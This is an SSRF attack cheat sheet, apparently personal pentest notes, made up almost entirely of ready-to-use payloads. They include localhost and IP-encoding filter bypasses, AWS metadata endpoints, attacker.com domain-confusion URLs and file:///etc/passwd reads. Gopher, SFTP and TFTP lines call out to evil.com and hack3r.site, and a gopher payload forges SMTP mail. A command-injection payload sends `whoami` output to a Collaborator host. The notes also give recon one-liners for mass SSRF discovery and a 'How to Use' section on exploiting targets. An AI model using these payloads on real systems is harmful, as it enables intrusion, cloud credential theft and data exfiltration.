إليك تنظيم النقاط بشكل نصي عادي ومنظم:

---

### **SSRF (Server-Side Request Forgery) Payloads & Techniques**

#### **1. SSRF Payloads to Bypass Firewall**
1. **Bypass SSRF with CIDR**:
   ```bash
   http://127.127.127.127
   ```
2. **Bypass using Rare Address**:
   ```bash
   http://127.1
   ```
3. **Bypass using Tricks Combination**:
   ```bash
   http://1.1.1.802.2.2.2#03.3.3.3/
   urllib:3.3.3.3
   ```
4. **Bypass against a Weak Parser**:
   ```bash
   http://127.1.1.180@127.2.2.2:80/
   ```
5. **Bypass Localhost with `[::]`**:
   ```bash
   http://[::]:80/
   http://0000::1:80/
   ```

#### **2. What SSRF Allows**
- **Access Services on Loopback Interface**:
  ```bash
  Access services running on the loopback interface.
  ```
- **Scan Internal Network**:
  ```bash
  Scan and interact with internal network services.
  ```
- **Read Local Files**:
  ```bash
  Use `file://` protocol handler to read local files.
  ```
- **Lateral Movement**:
  ```bash
  Move laterally within the internal environment.
  ```

#### **3. Finding SSRF**
- **External Resource Access**:
  ```bash
  Test if the application allows loading external resources (e.g., profile images).
  ```
- **Port Scanning**:
  ```bash
  Use Burp Suite Intruder to scan ports by manipulating URLs.
  ```
- **Internal IP Scanning**:
  ```bash
  Scan private IP ranges like 192.168.x.x to discover alive hosts.

#### **4. AWS Metadata Retrieval**
- **AWS Metadata Endpoints**:
  ```bash
  http://169.254.169.254/computeMetadata/v1
  http://169.254.169.254/latest/meta-data
  ```

#### **5. URL Manipulation**
- **Burp Collaborator**:
  ```bash
  If the response has a link parameter, try sending it with your Burp Collaborator.
  ```
- **Open Redirect**:
  ```bash
  https://www.hahwul.com/phoenix/ssrf-open-redirect/
  ```

#### **6. Advanced SSRF Techniques**
- **Host Header Manipulation**:
  ```bash
  curl ip -H 'HOST: localhost'
  ```
- **Subdomain Manipulation**:
  ```bash
  target.com.(aydomain has IP 127.0.0.1)
  ```
- **Special Characters**:
  ```bash
  trarget.\com/%09/myburpcollab
  trarget.\com//myburpcollab
  trarget.\com\\myburpcollab
  target.\com/%0d/myburpcollab
  redirect_uri=target.\com&redirect_uri=attacker\.com
  redirect_uri=target.\com%40myburpcollab.\com
  ```
- **URL Parser Logic**:
  ```bash
  http://evil§google.com
  http://127.1:80@127.2.2.280/
  http://127.1:80@@127.2.2.280/
  0://evil.com:80http://google.com:80/
  ```
- **Unicode Normalization**:
  ```bash
  http://gооgle.com
  http://gⓞⓞgle.cⓞm
  ```
- **Address Encoding**:
  ```bash
  http://0177.0.0.1           # Octal Representation
  http://2130706433/          # Decimal Representation
  http://0x7f.0x0.0x0.0x1/    # Hex Representation
  http://0177.0x0.0x0.0x1/    # Mixed Representation
  ```
- **Localhost Representation**:
  ```bash
  http://0/
  http://127.1/
  http://0.0.0.0/
  http://127.127.127.127/
  ```

#### **7. IPv4 & IPv6 Variations**
- **IPv4 Standard Format**:
  ```bash
  http://127.0.0.1/
  ```
- **IPv4 Shortened Formats**:
  ```bash
  http://127.1/
  http://127.0.1/
  ```
- **IPv4 Decimal Representation**:
  ```bash
  http://2130706433/
  ```
- **IPv6 Representations**:
  ```bash
  http://[::1]/               # Standard IPv6 localhost
  http://[::ffff:127.0.0.1]/  # Mixed IPv6/IPv4
  ```
- **Localhost Name Variants**:
  ```bash
  http://localhost/
  http://localhost.localdomain/
  http://127.in-addr.arpa/
  ```
- **Empty Host**:
  ```bash
  http:///
  http://0/
  ```
- **Loopback Address Variants**:
  ```bash
  http://127.0.0.254/
  http://10.0.0.1/            # مثال لاختبار خاص بشبكات داخلية
  ```
- **Unicode and Punycode Normalization**:
  ```bash
  http://locaⅼhost/          # "l" مكتوب بـ Unicode مختلف
  http://lоcalhost/          # "o" مكتوب بشكل مختلف
  ```
- **Port Variations**:
  ```bash
  http://127.0.0.1:80/
  http://127.0.0.1:443/
  http://localhost:8080/
  http://localhost:3000/
  ```

#### **8. Blind SSRF Chains**
- **GitHub Resource**:
  ```bash
  https://github.com/assetnote/blind-ssrf-chains
  ```

#### **9. Automation Tools**
- **Findomain & Gau**:
  ```bash
  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace your.burpcollaborator.net
  ```

---

### **How to Use This Information**
1. **Payload Testing**:
   - Use the provided payloads to test for SSRF vulnerabilities.
2. **Internal Network Scanning**:
   - Scan internal networks and services using SSRF.
3. **AWS Metadata Retrieval**:
   - Exploit SSRF to retrieve AWS metadata.
4. **URL Manipulation**:
   - Manipulate URLs to bypass filters and access restricted resources.
5. **Automation**:
   - Use tools like Findomain and Gau to automate SSRF discovery.

---

### **To fuzz for inoternal Ports**
- https://github.com/a7madn1/Fuzzing

---

# SSRF (Server Side Request Forgery)
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.


# Capture SSRF
* Burpcollab
* http://pingb.in
* https://canarytokens.org/generate
* https://github.com/projectdiscovery/interactsh
* https://github.com/teknogeek/ssrf-sheriff
* https://webhook.site/#!/f97e9831-53bd-45c5-8d05-232dd08b9ed6
* http://requestrepo.com
* https://app.interactsh.com
* https://github.com/stolenusername/cowitness

# Bypass SSRF Protection

* **Encode-IP**
  
    The Burp extension Burp-Encode-IP implements IP formatting bypasses


* **Localhost**
```html
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1

```
* **Domain Parser**
```html
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ

```
* **Domain Confusion**
```html
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com

```

* **Other Confusions**

 https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/

* **Bypass via open redirect**

Read more here: https://portswigger.net/web-security/ssrf

# Protocols

* file://
```html
file:///etc/passwd

```
* dict://
```html
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/

```
* SFTP://
```html
ssrf.php?url=sftp://evil.com:11111/

```
* TFTP://
```html
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

```
* LDAP://
```html
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit

```
* Gopher://
```html
//Gopher smtp
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT

//Gopher HTTP
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body

//Gopher SMTP — Back connect to 1337
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.

```
* **Curl URL globbing - WAF bypass**
  * https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi
  * https://everything.curl.dev/cmdline/globbing

```html
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}

```

* **SSRF via Referrer header**

Some applications employ server-side analytics software that tracks visitors. This software often logs the Referrer header in requests, since this is of particular interest for tracking incoming links. Often the analytics software will actually visit any third-party URL that appears in the Referrer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.
To discover this kind of "hidden" vulnerabilities you could use the plugin "Collaborator Everywhere" from Burp.

* **SSRF via SNI data from certificate**

The simplest misconfiguration that would allow you to connect to an arbitrary backend would look something like this
```html
stream {
    server {
        listen 443; 
        resolver 127.0.0.11;
        proxy_pass $ssl_preread_server_name:443;       
        ssl_preread on;
    }
}

```
Here, the SNI field value is used directly as the address of the backend.
With this insecure configuration, we can exploit the SSRF vulnerability simply by specifying the desired IP or domain name in the SNI field. For example, the following command would force Nginx to connect to internal.host.com
```bash
openssl s_client -connecttarget.com:443 -servername "internal.host.com" -crlf

```
* **wget File Upload**

```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080

```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]


```

Note that another option you may be thinking of to bypass this check is to make the HTTP server redirect to a different file, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This won't work unless wget is being used with the parameter --trust-server-names because wget will download the redirected page with the name of the file indicated in the original URL.

* **Command Injection**

It might be worth trying a payload like:

```html
url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`

```

# Blind SSRF

* **Time based SSRF**

Checking the time of the responses from the server it might be possible to know if a resource exists or not (maybe it takes more time accessing an existing resource than accessing one that doesn't exist)

## SSRF to XSS
```html
http://brutelogic.com.br/poc.svg      //simple alert
https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=      //simple ssrf

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg

```

## SSRF from XSS

**Using an iframe**

The content of the file will be integrated inside the PDF as an image or text
```javascript
<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

```

**Using an attachment**

Example of a PDF attachment using HTML

1. use `<link rel=attachment href="URL">` as Bio text
2. use `'Download Data'` feature to get PDF
3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
4. cat `attachment.bin`

# SSRF on Flask Through Incorrect Pathname Interpretation
Flask accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds 404 Not Found:
```html
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
Below is an example of the code:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
  return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
"What if the developer forgets to add the last slash in the SITE_NAME variable?". And yes, it can lead to an **SSRF**.
Since Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.

Please consider the following source code as a reference for the exploitation scenario:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
  return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
    app.run(threaded=False)
```

Presented below is an example of an exploitation request:
```html
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
In the following example, I was able to fetch my EC2 metadata:
![ssrf-flask](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/529505bd-4b79-4ad4-8317-546f0a72e9a4)

# SSRF on Spring Boot Through Incorrect Pathname Interpretation
Spring framework accepts the matrix parameter separator character `;` before the **first slash** of the HTTP pathname:

```html
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```

If a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of **Server-Side Request Forgery (SSRF)**.

Please consider the following source code as a reference for the exploitation scenario:

![ssrf-2](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/fb40bae1-ba78-4631-b4ab-4937725ce382)

The code snippet above utilizes the `HttpServletRequest` API to retrieve the requested URL through the `getRequestURI()` function. Subsequently, it concatenates the requested URI with the destination endpoint **ifconfig.me**.

Considering that Spring permits any character following the Matrix parameter separator, becoming possible to use the `@` character to fetch an arbitrary endpoint as well.

Below is an example of the exploit request:

```html
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
![ssrf-3](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/c3486635-b964-49c8-8882-300a75e0931b)



# SSRF at a glance
[SSRF (Server-Side Request Forgery ).pdf](https://github.com/Mehdi0x90/Web_Hacking/files/12438160/SSRF.Server-Side.Request.Forgery.pdf)


# Automate SSRF
```bash
# method 1
echo https://target.com | waybackurls | httpx -silent | gf ssrf | qsreplace <burpcollaborator url> | xarg -I{} http GET {}

# method 2
echo https://target.com | waybackurls | httpx -silent | gf ssrf | qsreplace <burpcollaborator url> | httpx
```

# Tools

* https://github.com/swisskyrepo/SSRFmap
* https://github.com/tarunkant/Gopherus
* https://github.com/qtc-de/remote-method-guesser

---
- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet#id=8abff2b134596d1a84408e32730f1cc9c37cf68b
- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
- https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
- https://github.com/akincibor/SSRFexploit
- https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b
- https://github.com/cujanovic/SSRF-Testing/blob/master/cloud-metadata.txt
- https://github.com/MightyPirates/OpenComputers/security/advisories/GHSA-vvfj-xh7c-j2cm
- https://github.com/cujanovic/SSRF-Testing
- https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb
- https://hackerone.com/reports/341876?fbclid=IwY2xjawIXImtleHRuA2FlbQIxMAABHZdHszMnAa3hciTXI-ynqJWl5puxQZm9XMfLwge48ljY0qwpFdtAZuC34Q_aem_lpCrr2aXbYPt2WgE-R0u9A
- https://www.hackerone.com/blog/how-server-side-request-forgery-ssrf

